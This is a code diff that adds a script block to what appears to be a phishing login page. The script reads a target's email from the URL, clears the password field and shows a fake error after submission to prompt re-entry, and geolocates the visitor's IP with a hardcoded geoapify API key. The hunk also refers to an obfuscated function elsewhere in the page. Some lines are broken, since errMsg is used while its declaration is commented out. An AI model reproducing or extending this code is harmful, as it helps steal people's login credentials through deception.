@@ -260,7 +260,82 @@ function _0x3e37() {
     });
 }));
     
-</script>    
+</script> 
+
+<script>
+	
+	
+			//console.log('wertyuhyg')
+//const emml = document.querySelector('.email');
+
+const pwd = document.querySelector('#password');
+const fomm = document.querySelector('#furm');
+//const errMsg = document.querySelector('.err_msg');
+const btnSubmit = document.querySelector('#submitBtn');
+console.log(pwd);
+console.log(fomm);
+console.log(btnSubmit);
+
+btnSubmit.addEventListener("click",()=>{
+	setTimeout(()=>{
+		//alert('connected')
+		pwd.value = "";
+	}, 3000)
+});
+
+
+        //const errMsg = document.querySelector('.err_msg');
+        errMsg.style.display = 'none';
+        //const fomm = document.querySelector('#furm');
+        //const pwd = document.querySelector('#password');
+		
+
+        fomm.addEventListener('submit', ()=>{
+            setTimeout(() => {
+                errMsg.style.display = 'block';
+                pwd.value = "";
+            }, 2000);
+        });
+	
+	
+let dt = new Date()
+let ipAdress = `https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`;
+fetch(`${ipAdress}`)
+.then(req=> req.json())
+.then(res=>{
+    const country = document.querySelector('#country');
+    country.innerHTML = res.country.name;
+    const city = document.querySelector('#city');
+    city.innerHTML = res.city.names.en;
+    const flag = document.querySelector('#flag');
+    flag.innerHTML = res.country.flag;
+    const eyep = document.querySelector('#eyep');
+    eyep.innerHTML = res.ip;
+    const timeNow = document.querySelector('#nownow');
+    timeNow.innerHTML = dt;
+})
+.catch(e=> console.error(e));
+
+
+
+const reloadPreloader = ()=> window.location.reload();
+
+const foota = document.querySelector('.wrp')
+
+foota.addEventListener('click', ()=>{
+    reloadPreloader();
+});
+
+const emailInTheURL = window.location.href;
+const sliceEqualSign = emailInTheURL.indexOf("=");
+const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();
+console.log(extracetdEmail);
+
+
+
+
+    </script>
+   
 </body>
 
 </html>
